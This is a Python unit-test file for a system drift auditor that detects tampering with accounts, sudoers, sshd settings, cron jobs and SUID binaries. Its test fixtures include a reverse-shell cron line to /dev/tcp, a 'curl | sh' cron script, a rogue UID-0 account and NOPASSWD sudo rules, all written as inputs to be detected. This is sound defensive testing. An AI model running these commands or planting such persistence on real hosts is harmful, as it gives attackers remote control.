import contextlib
import io
import json
import os
import stat
import tempfile
import unittest
from dataclasses import asdict

import yaml

from sysdrift import cli
from sysdrift.auditor import Auditor
from sysdrift.baseline import ScanConfig, build_baseline, load_baseline, load_key, save_baseline
from sysdrift.errors import BaselineError, IntegrityError
from sysdrift.sshd import parse_sshd_config

SSHD = """Port 22
PermitRootLogin no
PasswordAuthentication no
PubkeyAuthentication yes
X11Forwarding no
Match Address 10.0.0.0/8
    PasswordAuthentication yes
"""


class Sandbox(unittest.TestCase):
    def setUp(self):
        self._tmp = tempfile.TemporaryDirectory()
        self.root = self._tmp.name
        self.addCleanup(self._tmp.cleanup)
        self.w("etc/passwd", "root:x:0:0:root:/root:/bin/bash\nbob:x:1000:1000::/home/bob:/bin/bash\n", 0o644)
        self.w("etc/group", "root:x:0:\n", 0o644)
        self.w("etc/shadow", "root:!:1:::::\n", 0o640)
        self.w("etc/sudoers", "root ALL=(ALL:ALL) ALL\n#includedir %s\n" % self.p("etc/sudoers.d"), 0o440)
        self.w("etc/sudoers.d/90-ops", "%ops ALL=(root) /usr/bin/systemctl\n", 0o440)
        self.w("etc/ssh/sshd_config", SSHD, 0o644)
        self.w("etc/crontab", "# m h dom mon dow user cmd\n0 3 * * * root /usr/bin/backup\n", 0o644)
        self.w("etc/cron.d/job", "*/5 * * * * root /usr/bin/check\n", 0o644)
        self.w("etc/cron.daily/rotate", "#!/bin/sh\nlogrotate\n", 0o755)
        self.w("bin/ls", "binary-ls", 0o755)
        self.w("bin/passwd", "binary-passwd", 0o4755)
        self.cfg = ScanConfig(
            passwd=self.p("etc/passwd"), group=self.p("etc/group"), shadow=self.p("etc/shadow"),
            sudoers=self.p("etc/sudoers"), sudoers_dir=self.p("etc/sudoers.d"),
            sshd_config=self.p("etc/ssh/sshd_config"), cron_files=[self.p("etc/crontab")],
            cron_policy_files=[], cron_tab_dirs=[self.p("etc/cron.d")],
            cron_script_dirs=[self.p("etc/cron.daily")], scan_suid=True,
            suid_roots=[self.p("bin")], suid_exclude=[], extra_files=[],
        )
        self.doc = build_baseline(self.cfg)

    def p(self, rel):
        return os.path.join(self.root, rel)

    def w(self, rel, content, mode=0o644):
        path = self.p(rel)
        os.makedirs(os.path.dirname(path), exist_ok=True)
        if os.path.exists(path):
            os.chmod(path, 0o600)
        with open(path, "w") as fh:
            fh.write(content)
        os.chmod(path, mode)

    def audit(self):
        return Auditor(json.loads(json.dumps(self.doc))).run()

    def find(self, result, category, severity=None):
        hits = [f for f in result.findings if f.category == category and (severity in (None, f.severity))]
        self.assertTrue(hits, "no %s/%s in %s" % (category, severity, [(f.category, f.severity) for f in result.findings]))
        return hits[0]


class DriftTests(Sandbox):
    def test_clean_system_has_no_drift(self):
        result = self.audit()
        self.assertEqual([(f.category, f.title) for f in result.findings], [])

    def test_new_uid0_account(self):
        self.w("etc/passwd", open(self.p("etc/passwd")).read() + "toor:x:0:0::/root:/bin/sh\n", 0o644)
        result = self.audit()
        self.find(result, "ACCOUNT_ADDED", "critical")
        self.find(result, "FILE_MODIFIED", "critical")

    def test_shell_gained_by_service_account(self):
        self.w("etc/passwd", "root:x:0:0:root:/root:/bin/bash\nbob:x:1000:1000::/home/bob:/usr/sbin/nologin\n")
        base = build_baseline(self.cfg)
        self.w("etc/passwd", "root:x:0:0:root:/root:/bin/bash\nbob:x:1000:1000::/home/bob:/bin/bash\n")
        self.find(Auditor(base).run(), "ACCOUNT_MODIFIED", "high")

    def test_shadow_made_world_readable(self):
        os.chmod(self.p("etc/shadow"), 0o644)
        self.find(self.audit(), "PERMISSIONS_CHANGED", "critical")

    def test_shadow_content_is_never_hashed(self):
        rec = self.doc["state"]["core_files"][self.p("etc/shadow")]
        self.assertNotIn("sha256", rec)
        self.w("etc/shadow", "root:$6$changed:1:::::\n", 0o640)
        self.assertEqual(self.audit().findings, [])

    def test_baseline_captured_insecure_is_flagged(self):
        os.chmod(self.p("etc/shadow"), 0o666)
        base = build_baseline(self.cfg)
        self.find(Auditor(base).run(), "INSECURE_PERMISSIONS", "critical")

    def test_new_suid_binary(self):
        self.w("bin/backdoor", "evil", 0o4755)
        finding = self.find(self.audit(), "SUID_ADDED", "critical")
        self.assertTrue(finding.path.endswith("bin/backdoor"))

    def test_sgid_binary_also_detected(self):
        self.w("bin/sgidtool", "x", 0o2755)
        self.find(self.audit(), "SUID_ADDED", "critical")

    def test_suid_binary_replaced(self):
        self.w("bin/passwd", "trojaned", 0o4755)
        self.find(self.audit(), "SUID_MODIFIED", "critical")

    def test_sshd_root_login_enabled(self):
        self.w("etc/ssh/sshd_config", SSHD.replace("PermitRootLogin no", "PermitRootLogin yes"))
        result = self.audit()
        finding = self.find(result, "SSH_SETTING_CHANGED", "critical")
        self.assertIn("PermitRootLogin", finding.title)
        self.find(result, "SSH_FILE_MODIFIED")

    def test_sshd_removal_reverts_to_insecure_default(self):
        self.w("etc/ssh/sshd_config", SSHD.replace("PasswordAuthentication no\n", ""))
        self.find(self.audit(), "SSH_SETTING_CHANGED", "high")

    def test_sshd_match_block_added(self):
        self.w("etc/ssh/sshd_config", SSHD + "Match User eve\n    PermitRootLogin yes\n")
        self.find(self.audit(), "SSH_MATCH_BLOCK_CHANGED", "high")

    def test_cron_reverse_shell_job(self):
        self.w("etc/cron.d/job", "*/5 * * * * root /usr/bin/check\n* * * * * root bash -i >& /dev/tcp/1.2.3.4/9 0>&1\n")
        self.find(self.audit(), "CRON_JOB_ADDED", "critical")

    def test_cron_comment_only_change_is_low(self):
        self.w("etc/cron.d/job", "# harmless note\n*/5 * * * * root /usr/bin/check\n")
        self.find(self.audit(), "CRON_FILE_MODIFIED", "low")

    def test_new_cron_script(self):
        self.w("etc/cron.daily/implant", "#!/bin/sh\ncurl http://x | sh\n", 0o755)
        self.find(self.audit(), "CRON_FILE_ADDED", "high")

    def test_sudoers_nopasswd_rule(self):
        self.w("etc/sudoers", open(self.p("etc/sudoers")).read() + "bob ALL=(ALL) NOPASSWD: ALL\n", 0o440)
        self.find(self.audit(), "SUDOERS_RULE_ADDED", "critical")

    def test_sudoers_dropin_added(self):
        self.w("etc/sudoers.d/99-x", "eve ALL=(ALL) NOPASSWD: ALL\n", 0o440)
        self.find(self.audit(), "SUDOERS_FILE_ADDED", "critical")

    def test_file_removed(self):
        os.unlink(self.p("etc/group"))
        self.find(self.audit(), "FILE_REMOVED", "high")

    def test_symlink_swap_detected(self):
        os.unlink(self.p("etc/group"))
        os.symlink("/etc/passwd", self.p("etc/group"))
        self.find(self.audit(), "FILE_TYPE_CHANGED")


class IntegrityTests(Sandbox):
    def test_roundtrip_and_tamper(self):
        path = self.p("out/baseline.json")
        save_baseline(self.doc, path)
        self.assertEqual(stat.S_IMODE(os.stat(path).st_mode), 0o600)
        doc, status = load_baseline(path)
        self.assertIn("checksum verified", status)
        self.assertEqual(Auditor(doc, status).run().findings, [])
        text = open(path).read()
        victim = next(iter(doc["state"]["suid_sgid"].values()))["sha256"]
        open(path, "w").write(text.replace(victim, "0" * 64))
        with self.assertRaises(IntegrityError):
            load_baseline(path)

    def test_hmac_signing(self):
        key = b"k" * 32
        doc = build_baseline(self.cfg, key)
        path = self.p("signed.json")
        save_baseline(doc, path)
        _, status = load_baseline(path, key)
        self.assertIn("HMAC-SHA256", status)
        with self.assertRaises(IntegrityError):
            load_baseline(path, b"x" * 32)
        with self.assertRaises(IntegrityError):
            load_baseline(path, None)

    def test_unsigned_baseline_rejected_when_key_supplied(self):
        path = self.p("unsigned.json")
        save_baseline(self.doc, path)
        with self.assertRaises(IntegrityError):
            load_baseline(path, b"k" * 32)

    def test_refuses_overwrite(self):
        path = self.p("b.json")
        save_baseline(self.doc, path)
        with self.assertRaises(BaselineError):
            save_baseline(self.doc, path)
        save_baseline(self.doc, path, force=True)

    def test_short_key_rejected(self):
        keyfile = self.p("short.key")
        open(keyfile, "w").write("abc")
        os.chmod(keyfile, 0o600)
        with self.assertRaises(BaselineError):
            load_key(keyfile)


class ParserTests(Sandbox):
    def test_sshd_include_and_match(self):
        self.w("etc/ssh/sshd_config", "Include conf.d/*.conf\nPort 22\n")
        self.w("etc/ssh/conf.d/10.conf", "PermitRootLogin no\nMatch User x\n  X11Forwarding yes\n")
        parsed = parse_sshd_config(self.p("etc/ssh/sshd_config"))
        self.assertTrue(parsed["parsed"])
        self.assertEqual(parsed["settings"]["permitrootlogin"], ["no"])
        self.assertEqual(parsed["match_blocks"][0]["settings"]["x11forwarding"], ["yes"])
        self.assertEqual(len(parsed["files"]), 2)

    def test_sshd_equals_syntax(self):
        self.w("etc/ssh/sshd_config", "Port=2222\nPermitRootLogin = no\n")
        parsed = parse_sshd_config(self.p("etc/ssh/sshd_config"))
        self.assertEqual(parsed["settings"]["port"], ["2222"])
        self.assertEqual(parsed["settings"]["permitrootlogin"], ["no"])


class CliTests(Sandbox):
    def run_cli(self, *argv):
        out, err = io.StringIO(), io.StringIO()
        with contextlib.redirect_stdout(out), contextlib.redirect_stderr(err):
            code = cli.main(list(argv))
        return code, out.getvalue(), err.getvalue()

    def test_end_to_end(self):
        cfg = self.p("scan.yaml")
        yaml.safe_dump(asdict(self.cfg), open(cfg, "w"))
        base = self.p("base.json")
        self.assertEqual(self.run_cli("init", "--output", base, "--config", cfg)[0], 0)
        code, out, _ = self.run_cli("audit", "--baseline", base)
        self.assertEqual(code, 0)
        self.assertIn("No drift detected", out)

        self.w("bin/evil", "x", 0o4755)
        self.w("etc/ssh/sshd_config", SSHD.replace("PermitRootLogin no", "PermitRootLogin yes"))
        code, out, _ = self.run_cli("audit", "--baseline", base)
        self.assertEqual(code, 1)
        self.assertIn("SUID_ADDED", out)
        self.assertIn("[CRITICAL]", out)

        code, out, _ = self.run_cli("report", "--baseline", base, "--format", "json")
        self.assertEqual(code, 0)
        report = json.loads(out)
        self.assertGreaterEqual(report["summary"]["by_severity"]["critical"], 2)
        self.assertEqual(report["findings"][0]["severity"], "critical")
        code, out, _ = self.run_cli("report", "--baseline", base, "--format", "yaml", "--min-severity", "critical")
        self.assertEqual(code, 0)
        self.assertTrue(all(f["severity"] == "critical" for f in yaml.safe_load(out)["findings"]))

    def test_exit_codes(self):
        self.assertEqual(self.run_cli("audit", "--baseline", self.p("missing.json"))[0], 2)
        bad = self.p("bad.json")
        open(bad, "w").write("{}")
        self.assertEqual(self.run_cli("audit", "--baseline", bad)[0], 2)
        base = self.p("b.json")
        save_baseline(self.doc, base)
        text = open(base).read().replace('"digest": "', '"digest": "0')
        open(base, "w").write(text)
        self.assertEqual(self.run_cli("audit", "--baseline", base)[0], 3)

    def test_keygen_and_signed_flow(self):
        cfg = self.p("scan.yaml")
        yaml.safe_dump(asdict(self.cfg), open(cfg, "w"))
        key, base = self.p("k.key"), self.p("s.json")
        self.assertEqual(self.run_cli("keygen", "-o", key)[0], 0)
        self.assertEqual(stat.S_IMODE(os.stat(key).st_mode), 0o600)
        self.assertEqual(self.run_cli("init", "-o", base, "-c", cfg, "-k", key)[0], 0)
        self.assertEqual(self.run_cli("audit", "-b", base, "-k", key)[0], 0)
        self.assertEqual(self.run_cli("audit", "-b", base)[0], 3)


if __name__ == "__main__":
    unittest.main()
